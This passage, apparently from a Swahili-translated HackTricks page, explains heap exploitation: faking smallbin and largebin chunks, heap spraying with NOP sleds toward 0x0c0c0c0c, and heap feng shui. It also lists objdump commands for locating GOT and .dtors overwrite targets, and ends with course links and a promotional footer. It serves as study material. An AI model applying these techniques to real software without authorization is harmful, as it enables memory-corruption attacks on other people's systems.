Ili kutekeleza udhaifu haraka iwezekanavyo, ni bora: Kuhifadhi sehemu inayoweza kudhuriwa, kuhifadhi sehemu itakayobadilishwa, kufungua sehemu hii, kuhifadhi sehemu kubwa kuliko ile itakayobadilishwa, kubadilisha sehemu (udhaifu), kuhifadhi sehemu ya ukubwa sawa na ile iliyovunjwa na kuhifadhi sehemu ya pili ya ukubwa sawa na hiyo na hii itakuwa ile itakayoelekeza kwenye anwani iliyochaguliwa.

Kulinda shambulio hili, uthibitisho wa kawaida kwamba sehemu "si" ni ya uwongo hutumiwa: inathibitishwa ikiwa bck->fd inaelekeza kwa mwathiriwa. Yaani, katika kesi yetu ikiwa pointer wa fd\* wa sehemu ya uwongo iliyoelekezwa kwenye stack inaelekeza kwa mwathiriwa. Ili kuvuka ulinzi huu, mshambuliaji lazima aweze kuandika kwa njia fulani (labda kwa stack) kwenye anwani sahihi ya mwathiriwa. Ili ionekane kama sehemu ya kweli.

**Uharibifu wa LargeBin**

Mahitaji sawa na hapo awali yanahitajika na mengine zaidi, pamoja na sehemu zilizohifadhiwa lazima ziwe kubwa kuliko 512.

Shambulio ni kama lile lililopita, yaani, lazima kubadilisha pointer bk na wito wote huo wa malloc(), lakini pia lazima kubadilisha ukubwa wa sehemu iliyobadilishwa ili ukubwa huo - nb uwe < MINSIZE.

Kwa mfano, itabidi kuweka ukubwa kuwa 1552 ili 1552 - 1544 = 8 < MINSIZE (kutoa haitaweza kuwa hasi kwa sababu inalinganishwa na isiyosainiwa)

Pia, kuna kipande cha programu kilichoingizwa ili kufanya iwe ngumu zaidi.

**Heap Spraying**

Kimsingi inahusisha kuhifadhi kumbukumbu yote inayowezekana kwa heaps na kuzijaza na safu ya nops ikimalizika na shellcode. Kama safu, 0x0c hutumiwa. Kwa hivyo, jaribio litakuwa kusonga kwenye anwani 0x0c0c0c0c, na hivyo ikiwa anwani yoyote itaandikwa na safu hii itaenda kule. Kimsingi mkakati ni kuhifadhi kiasi kikubwa iwezekanavyo kuona ikiwa pointer yoyote itaandikwa na kusonga kwa 0x0c0c0c0c kwa matumaini kwamba kuna nops huko.

**Heap Feng Shui**

Inahusisha kusambaza kumbukumbu kwa njia ya kuhifadhi na kufungua kumbukumbu ili kubaki sehemu zilizohifadhiwa kati ya sehemu zilizofunguliwa. Buffer ya kufurika itawekwa kwenye moja ya vipande hivi.

**objdump -d executable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCTION** ‚Äî> Pata anwani ya kazi\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kama ni shellcode yetu na kutoa OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Jedwali la alama, ili kutoa anwani za pembejeo na kazi\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Ili kutoa anwani za kazi za maktaba (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Inatoa anwani ya puts itakayobadilishwa kwenye GOT\
**objdump -D ./exec** ‚Äî> Disas ALL hadi kuingia kwa plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Maelezo ya kazi katika gdb

## Kozi Zinazovutia

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Vyanzo**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
